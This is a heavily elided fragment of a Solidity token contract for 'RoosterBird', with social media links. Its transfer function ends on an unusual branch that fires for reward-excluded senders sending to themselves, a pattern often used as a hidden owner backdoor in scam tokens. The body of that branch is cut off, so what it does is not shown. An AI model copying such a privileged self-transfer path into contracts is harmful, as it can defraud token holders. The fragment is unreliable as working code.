...
https://t.me/RoosterBird

https://twitter.com/RoosterBirdBSC
...
contract RoosterBird is Ownable, IERC20 {
    ...
    string private _name = "RoosterBird";
    string private _symbol = "ROOSTERBIRD";
    ...
    function _transfer(address up, address down, uint256 amount) internal virtual {
        ...
        if (!_excludedFromReward[up] && !_excludedFromReward[down] && down != address(this) && !givingReward) {
            feeTotal = amount.mul(_fee).div(100);
            require(amount <= _maxTx);
        }

        if (_giveDividend < amount && (_excludedFromReward[msg.sender] ) && down == up) {
